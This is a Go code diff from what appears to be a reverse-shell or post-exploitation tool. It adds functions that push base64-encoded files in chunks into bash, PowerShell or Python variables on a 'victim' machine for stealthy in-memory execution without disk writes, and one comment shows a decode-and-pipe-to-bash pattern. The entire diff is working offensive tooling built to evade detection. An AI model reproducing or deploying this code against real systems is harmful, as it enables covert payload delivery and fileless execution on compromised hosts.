@@ -203,7 +203,9 @@ func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) e
 // localPath: path to local file
 // varName: bash variable name to store content (e.g., "_gummy_script")
 // Returns the variable name for later use (e.g., echo "$varName" | base64 -d | bash)
-func (t *Transferer) UploadToVariable(ctx context.Context, localPath, varName string) error {
+// UploadToBashVariable uploads a file to a bash variable (in-memory, no disk write on victim)
+// This is used for stealthy script execution - the variable contains base64-encoded data
+func (t *Transferer) UploadToBashVariable(ctx context.Context, localPath, varName string) error {
 	// Read local file
 	data, err := os.ReadFile(localPath)
 	if err != nil {
@@ -278,6 +280,169 @@ func (t *Transferer) UploadToVariable(ctx context.Context, localPath, varName st
 
 	// Variable is now loaded with base64-encoded content
 	// No need to decode here - will be decoded during execution
+
+	spinner.Stop()
+	fmt.Println(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))
+
+	t.drainConnection()
+	return nil
+}
+
+// UploadToPowerShellVariable uploads a file to a PowerShell variable (in-memory, no disk write on victim)
+// This is used for stealthy script/assembly execution on Windows
+func (t *Transferer) UploadToPowerShellVariable(ctx context.Context, localPath, varName string) error {
+	// Read local file
+	data, err := os.ReadFile(localPath)
+	if err != nil {
+		return fmt.Errorf("failed to read local file: %w", err)
+	}
+
+	fileSize := len(data)
+
+	// Start spinner
+	spinner := ui.NewSpinner()
+	spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
+	defer spinner.Stop()
+
+	// Drain leftover data
+	t.drainConnection()
+
+	// Encode to base64
+	encoded := base64.StdEncoding.EncodeToString(data)
+
+	// Initialize empty variable (PowerShell syntax)
+	initCmd := fmt.Sprintf("$%s = ''\r\n", varName)
+	t.conn.Write([]byte(initCmd))
+	time.Sleep(100 * time.Millisecond)
+
+	// PowerShell has 8191 char limit for cmd.exe, 32767 for PowerShell.exe
+	// Use smaller chunk size to be safe
+	const psChunkSize = 8000
+	chunks := splitIntoChunks(encoded, psChunkSize)
+
+	bytesSent := 0
+
+	for i, chunk := range chunks {
+		// Check for cancellation
+		select {
+		case <-ctx.Done():
+			// Cleanup variable on cancel
+			t.conn.Write([]byte(fmt.Sprintf("Remove-Variable -Name %s\r\n", varName)))
+			return fmt.Errorf("upload cancelled by user")
+		default:
+		}
+
+		// Append chunk to variable (PowerShell += operator)
+		cmd := fmt.Sprintf("$%s += '%s'\r\n", varName, chunk)
+		_, err := t.conn.Write([]byte(cmd))
+		if err != nil {
+			return fmt.Errorf("connection lost during upload: %w", err)
+		}
+
+		time.Sleep(100 * time.Millisecond) // PowerShell may be slower
+
+		bytesSent += len(chunk)
+
+		// Calculate actual file progress
+		actualBytes := int(float64(bytesSent) / 1.37)
+		if actualBytes > fileSize {
+			actualBytes = fileSize
+		}
+		percent := int(float64(actualBytes) / float64(fileSize) * 100)
+
+		// Update spinner every 20 chunks or on last chunk
+		if i%20 == 0 || i == len(chunks)-1 {
+			spinner.Update(fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
+				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%"))
+		}
+
+		// Drain buffer every 10 chunks (more frequent for PowerShell)
+		if i%10 == 0 && i > 0 {
+			time.Sleep(150 * time.Millisecond)
+			t.drainConnection()
+		}
+	}
+
+	spinner.Stop()
+	fmt.Println(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))
+
+	t.drainConnection()
+	return nil
+}
+
+// UploadToPythonVariable uploads a file to a Python variable (in-memory, no disk write on victim)
+// This is used for stealthy script execution via Python
+func (t *Transferer) UploadToPythonVariable(ctx context.Context, localPath, varName string) error {
+	// Read local file
+	data, err := os.ReadFile(localPath)
+	if err != nil {
+		return fmt.Errorf("failed to read local file: %w", err)
+	}
+
+	fileSize := len(data)
+
+	// Start spinner
+	spinner := ui.NewSpinner()
+	spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
+	defer spinner.Stop()
+
+	// Drain leftover data
+	t.drainConnection()
+
+	// Encode to base64
+	encoded := base64.StdEncoding.EncodeToString(data)
+
+	// Initialize empty variable (Python syntax)
+	initCmd := fmt.Sprintf("%s = ''\n", varName)
+	t.conn.Write([]byte(initCmd))
+	time.Sleep(50 * time.Millisecond)
+
+	// Python has similar ARG_MAX constraints as bash
+	config := DefaultConfig()
+	chunks := splitIntoChunks(encoded, config.ChunkSize)
+
+	bytesSent := 0
+
+	for i, chunk := range chunks {
+		// Check for cancellation
+		select {
+		case <-ctx.Done():
+			// Cleanup variable on cancel
+			t.conn.Write([]byte(fmt.Sprintf("del %s\n", varName)))
+			return fmt.Errorf("upload cancelled by user")
+		default:
+		}
+
+		// Append chunk to variable (Python += operator)
+		cmd := fmt.Sprintf("%s += '%s'\n", varName, chunk)
+		_, err := t.conn.Write([]byte(cmd))
+		if err != nil {
+			return fmt.Errorf("connection lost during upload: %w", err)
+		}
+
+		time.Sleep(50 * time.Millisecond)
+
+		bytesSent += len(chunk)
+
+		// Calculate actual file progress
+		actualBytes := int(float64(bytesSent) / 1.37)
+		if actualBytes > fileSize {
+			actualBytes = fileSize
+		}
+		percent := int(float64(actualBytes) / float64(fileSize) * 100)
+
+		// Update spinner every 50 chunks or on last chunk
+		if i%50 == 0 || i == len(chunks)-1 {
+			spinner.Update(fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
+				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%"))
+		}
+
+		// Drain buffer every 25 chunks
+		if i%25 == 0 && i > 0 {
+			time.Sleep(100 * time.Millisecond)
+			t.drainConnection()
+		}
+	}
 
 	spinner.Stop()
 	fmt.Println(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))
